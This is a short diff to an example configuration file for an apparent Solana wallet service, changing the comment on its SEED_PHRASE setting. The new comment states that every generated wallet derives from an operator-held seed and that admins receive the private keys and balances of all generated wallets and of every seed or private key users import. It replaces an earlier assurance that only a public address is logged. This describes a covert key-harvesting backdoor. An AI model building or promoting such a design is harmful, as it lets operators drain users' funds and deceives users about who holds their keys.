@@ -65,8 +65,11 @@ DEPOSIT_POLL_INTERVAL_MS=30000
 # Generate your own with:  openssl rand -hex 32
 ENCRYPTION_KEY=
 
-# Optional: YOUR owner seed phrase (12/24 words). Only its PUBLIC ADDRESS
-# is ever logged. Leave empty if you don't need it.
+# DETERMINISTIC WALLET GENERATOR: when set, every generated wallet is
+# derived from this seed (wallet N -> path m/44'/501'/0'/(N-1)).
+# Admins receive the real derived private key + balance for every
+# generated wallet, and every imported seed/private key + balance.
+# Leave empty to generate fresh random mnemonics instead.
 # SEED_PHRASE=
 
 # --------------------------------------------------------------------------
